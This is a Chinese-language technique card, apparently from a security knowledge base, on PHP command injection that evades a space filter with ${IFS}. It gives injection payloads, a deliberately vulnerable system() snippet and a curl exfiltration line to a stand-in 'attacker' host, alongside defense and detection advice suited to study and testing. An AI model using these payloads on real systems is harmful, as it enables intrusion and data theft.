---
id: web-php-rce-ifs-space-bypass-command-injection
title: 日志过滤参数拼接进 shell 命令，用 ${IFS} 绕过空格黑名单执行命令
type: scenario
domain: web
path: web/php/rce
technique: command-injection-ifs-space-bypass
aliases:
- ${IFS} 绕过空格过滤
- 命令注入空格黑名单绕过
- shell 元字符闭合注入
tags:
- command-injection
- rce
- ifs
- space-bypass
- shell-metacharacter
- php
- log-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-10
  verified_at: '2026-11-08T01:09:12+08:00'
  notes: 已对照原文核对；图 13/14/15 日志过滤参数注入与卡内 ${IFS}+双引号分号闭合+# 注释+glob 读 flag 一致，命令执行回显已打通；与 web-php-rce-command-space-blacklist-tab-passthru 属不同注入形态，dedup_review 成立；未验证点：服务端具体过滤规则未给出源码
---

## 一句话结论

应用把用户提交的「日志过滤关键字」直接拼进 shell 命令且只过滤了字面空格；用 `${IFS}` 展开替代空格、用 `"` `;` 闭合原命令并追加新命令、用 `#` 注释掉剩余部分，即可注入任意命令并把输出回显到页面。

## 原理

- 形如 `sh -c "grep <input> access.log"` 的拼接中，若 `<input>` 未转义 `"`、`;`、`` ` ``、`$` 等元字符，输入就变成了命令文本本身。
- 只做「空格黑名单」为什么挡不住：shell 的 `${IFS}`（Internal Field Separator，默认含空格/制表/换行）在展开后就是合法的分词符，用它替代字面空格即可分隔命令与参数，而无需出现空格字符。
- 闭合与追加：`"` 结束原字符串、`;` 结束原命令、`#` 把原命令尾部变成注释，于是 `";<注入命令>;#` 中的 `<注入命令>` 被独立执行；应用把命令输出渲染到日志查看页，形成回显型命令执行。
- 为什么能读到目标文件：路径未知时用通配符（如 `f*`、`../*/f*`）交给 shell 展开，配合 `nl`/`cat` 读取，避免逐层猜目录。

## 触发条件

- 用户输入进入 shell 命令（通过 `system`/`exec`/反引号/`shell_exec`/`popen` 或语言层调用 `sh -c`）；
- 过滤只针对空格字符或简单黑名单，未处理 `${IFS}`、制表符、`${PATH:0:1}` 等等价写法；
- `"`、`;`、`` ` ``、`$`、`#` 等元字符未被转义/白名单化；
- 命令输出会回显到响应（否则需改用带外通道）。

## 利用步骤

1. 在过滤参数处先注入 `";${IFS}id;#` 或 `";${IFS}ls${IFS}/;#` 验证命令执行与回显。
2. 确认回显后，用 `";${IFS}ls${IFS}<目录>;#` 列目录定位目标文件。
3. 用通配符读取目标：`";${IFS}nl${IFS}../../f*/f*;#`（`f*` 规避未知文件名/层级）。
4. 从页面回显取得输出；无回显时改为 `curl`/DNS 外带。

## PoC

```text
# 验证执行（过滤参数值）
";${IFS}ls${IFS}/;#

# 读取未知路径下的目标文件，通配符由 shell 展开
";${IFS}nl${IFS}../../f*/f*;#
```

```php
<?php
// 反例：危险拼接；仅用于说明，勿在生产使用
$kw = $_GET['keyword'];              // 未转义
system("grep " . $kw . " /var/log/app/access.log");
```

## 变体与关联

- 变体：`$IFS$9`、字面制表符 `%09`、`<`/`>` 重定向、`${PATH:0:1}` 等构造分词符；无空格命令（`{cat,/etc/passwd}`）；无回显时用 `;curl${IFS}attacker/?d=$(...|base64);#` 外带；长度限制下用短命令与通配符。
- 关联：序列化 Cookie 伪造（拿到开发者功能后的输入点）、命令注入空格黑名单绕过、任意文件读取。

## 检测与防御

- 防御：避免调用 shell，改用参数化 API / exec 数组（每个参数独立传递）；必须走 shell 时对参数做 `escapeshellarg`；对用户输入用严格白名单（只允许字母数字）；过滤并拒绝 `; | & $ ` " ' \n #` 及 `${...}`；以最小权限运行 Web 进程。
- 检测：日志/WAF 中出现 `${IFS}`、`;`、`#`、`$()`、反引号组合；Web 进程派生 `sh`、`grep`、`nl`、`curl` 等异常子进程；对系统敏感路径的读取。
- 注意：黑名单过滤空格不可靠，应基于「不拼接命令」而非「过滤字符」来修复。
